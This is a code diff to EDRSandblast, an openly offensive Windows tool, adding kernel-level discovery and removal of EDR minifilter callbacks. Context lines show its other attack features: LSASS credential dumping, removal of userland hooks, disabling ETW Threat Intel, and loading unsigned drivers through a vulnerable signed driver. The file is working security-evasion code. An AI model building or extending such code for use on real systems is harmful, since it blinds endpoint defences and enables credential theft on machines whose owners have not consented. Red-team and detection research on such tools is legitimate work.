@@ -10,17 +10,21 @@
 #include <assert.h>
 #endif
 
+#include "CiOffsets.h"
 #include "CredGuard.h"
 #include "DriverOps.h"
 #include "FileUtils.h"
+#include "FltmgrOffsets.h"
 #include "Firewalling.h"
 #include "ETWThreatIntel.h"
 #include "KernelCallbacks.h"
+#include "KernelDSE.h"
 #include "KernelMemoryPrimitives.h"
-#include "ProcessDump.h"
-#include "ProcessDumpDirectSyscalls.h"
+#include "MinifilterCallbacks.h"
 #include "NtoskrnlOffsets.h"
 #include "ObjectCallbacks.h"
+#include "ProcessDump.h"
+#include "ProcessDumpDirectSyscalls.h"
 #include "PEBBrowse.h"
 #include "PrintFunctions.h"
 #include "RunAsPPL.h"
@@ -28,8 +32,6 @@
 #include "Undoc.h"
 #include "UserlandHooks.h"
 #include "WdigestOffsets.h"
-#include "CiOffsets.h"
-#include "KernelDSE.h"
 
 //TODO P1 : implement a "clean" mode that only removes the driver if installed
 //TODO P2 : replace all instances of exit(1) by a clean_exit() function that uninstalls the driver before exiting
@@ -91,7 +93,7 @@ int _tmain(int argc, TCHAR** argv) {
     const TCHAR usage[] = TEXT("Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard | firewall | load_unsigned_driver> \n\
 [--usermode] [--unhook-method <N>] [--direct-syscalls] [--add-dll <dll name or path>]* \n\
 [--kernelmode] [--dont-unload-driver] [--no-restore] \n\
-    [--nt-offsets <NtoskrnlOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [--ci-offsets <CiOffsets.csv>] [--internet]\n\
+    [--nt-offsets <NtoskrnlOffsets.csv>] [--fltmgr-offsets <FltmgrOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [--ci-offsets <CiOffsets.csv>] [--internet]\n\
     [--vuln-driver <RTCore64.sys>] [--vuln-service <SERVICE_NAME>] \n\
     [--unsigned-driver <evil.sys>] [--unsigned-service <SERVICE_NAME>] \n\
     [--no-kdp]\n\
@@ -168,6 +170,8 @@ Offset-related options:\n\
 \n\
 --nt-offsets <NtoskrnlOffsets.csv>      Path to the CSV file containing the required ntoskrnl.exe's offsets.\n\
                                         Default to 'NtoskrnlOffsets.csv' in the current directory.\n\
+--fltmgr-offsets <FltmgrOffsets.csv>    Path to the CSV file containing the required fltmgr.sys's offsets\n\
+                                        Default to 'FltmgrOffsets.csv' in the current directory.\n\
 --wdigest-offsets <WdigestOffsets.csv>  Path to the CSV file containing the required wdigest.dll's offsets\n\
                                         (only for the 'credguard' mode).\n\
                                         Default to 'WdigestOffsets.csv' in the current directory.\n\
@@ -204,6 +208,7 @@ Dump options:\n\
     TCHAR ntoskrnlOffsetCSVPath[MAX_PATH] = { 0 };
     TCHAR wdigestOffsetCSVPath[MAX_PATH] = { 0 };
     TCHAR ciOffsetCSVPath[MAX_PATH] = { 0 };
+    TCHAR fltmgrOffsetCSVPath[MAX_PATH] = { 0 };
     TCHAR processName[] = TEXT("lsass.exe");
     TCHAR outputPath[MAX_PATH] = { 0 };
     BOOL verbose = FALSE;
@@ -219,6 +224,7 @@ Dump options:\n\
     BOOL ETWTIState = FALSE;
     BOOL foundNotifyRoutineCallbacks = FALSE;
     BOOL foundObjectCallbacks = FALSE;
+    BOOL foundMinifilterCallbacks = FALSE;
     HOOK* hooks = NULL;
     //TODO implement a "force" mode : remove notify routines & object callbacks without checking if it belongs to an EDR (useful as a last resort if a driver is not recognized)
 
@@ -304,6 +310,14 @@ Dump options:\n\
                 return EXIT_FAILURE;
             }
             _tcsncpy_s(ntoskrnlOffsetCSVPath, _countof(ntoskrnlOffsetCSVPath), argv[i], _tcslen(argv[i]));
+        }
+        else if (_tcsicmp(argv[i], TEXT("--fltmgr-offsets")) == 0) {
+            i++;
+            if (i > argc) {
+                _tprintf_or_not(TEXT("%s"), usage);
+                return EXIT_FAILURE;
+            }
+            _tcsncpy_s(fltmgrOffsetCSVPath, _countof(fltmgrOffsetCSVPath), argv[i], _tcslen(argv[i]));
         }
         else if (_tcsicmp(argv[i], TEXT("--wdigest-offsets")) == 0) {
             i++;
@@ -446,8 +460,8 @@ Dump options:\n\
             PathAppend(ntoskrnlOffsetCSVPath, offsetCSVName);
         }
 
-        _putts_or_not(TEXT("[+] Setting up prerequisites for the kernel read/write primitives..."));
-        // Initialize the global variable containing ntoskrnl.exe Notify Routines', _PS_PROTECTION and ETW TI functions offsets.
+        _putts_or_not(TEXT("[+] Loading required offsets for ntoskrnl.exe..."));
+
         if (FileExists(ntoskrnlOffsetCSVPath)) {
             _putts_or_not(TEXT("[+] Loading kernel related offsets from the CSV file"));
             LoadNtoskrnlOffsetsFromFile(ntoskrnlOffsetCSVPath);
@@ -481,6 +495,14 @@ Dump options:\n\
         // Print the kernel offsets in verbose mode.
         if (verbose) {
             PrintNtoskrnlOffsets();
+        }
+
+        if (_tcslen(fltmgrOffsetCSVPath) == 0) {
+            PathAppend(fltmgrOffsetCSVPath, currentFolderPath);
+            PathAppend(fltmgrOffsetCSVPath, TEXT("FltmgrOffsets.csv"));
+        }
+        if (!LoadFltmgrOffsets(fltmgrOffsetCSVPath, internet)) {
+            return EXIT_FAILURE;
         }
 
         // Install the vulnerable driver to have read / write in Kernel memory.
@@ -518,6 +540,7 @@ Dump options:\n\
             _putts_or_not(TEXT("[!] Couldn't allocate memory to enumerate the drivers in Kernel callbacks"));
             return EXIT_FAILURE;
         }
+
         foundNotifyRoutineCallbacks = EnumEDRNotifyRoutineCallbacks(foundEDRDrivers, verbose);
         if (foundNotifyRoutineCallbacks) {
             isSafeToExecutePayloadKernelland = FALSE;
@@ -529,6 +552,19 @@ Dump options:\n\
         _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\tObject callbacks are %s !\n"), foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
         if (foundObjectCallbacks) {
             isSafeToExecutePayloadKernelland = FALSE;
+        }
+        _putts_or_not(TEXT(""));
+
+        _putts_or_not(TEXT("[+] Checking if EDR callbacks are registered on I/O events (minifilters)..."));
+        foundMinifilterCallbacks = EnumEDRMinifilterCallbacks(foundEDRDrivers, verbose);
+        _tprintf_or_not(TEXT("[+] [MinifilterCallbacks]\tMinifilter callbacks are %s !\n"), foundMinifilterCallbacks ? TEXT("present") : TEXT("not found"));
+        
+        if (foundMinifilterCallbacks) {
+#if WriteMemoryPrimitiveIsAtomic
+            isSafeToExecutePayloadKernelland = FALSE;
+#else
+            _putts_or_not(TEXT("WARNING: with the current driver (") DEFAULT_DRIVER_FILE TEXT("), EDRSandblast will not be able to remove these callbacks"));
+#endif
         }
         _putts_or_not(TEXT(""));
 
@@ -826,7 +862,13 @@ Dump options:\n\
                 DisableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
                 _putts_or_not(TEXT(""));
             }
-
+#if WriteMemoryPrimitiveIsAtomic
+            if (foundMinifilterCallbacks) {
+                _putts_or_not(TEXT("[+] Removing minifilter callbacks registered by EDR for monitoring I/O operations..."));
+                RemoveEDRMinifilterCallbacks(foundEDRDrivers);
+                _putts_or_not(TEXT(""));
+            }
+#endif
             /*
             * 2/3 : Starting "resursively" our process.
             */
@@ -865,7 +907,13 @@ Dump options:\n\
                 EnableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
                 _putts_or_not(TEXT(""));
             }
-
+#if WriteMemoryPrimitiveIsAtomic
+            if (restoreCallbacks == TRUE && foundMinifilterCallbacks) {
+                _putts_or_not(TEXT("[+] Restoring EDR's minifilter callbacks..."));
+                RestoreEDRMinifilterCallbacks(foundEDRDrivers);
+                _putts_or_not(TEXT(""));
+            }
+#endif
             // Renable the ETW Threat Intel provider.
             // TODO : make this conditionnal, just as kernel callbacks restoring ?
             if (ETWTIState) {
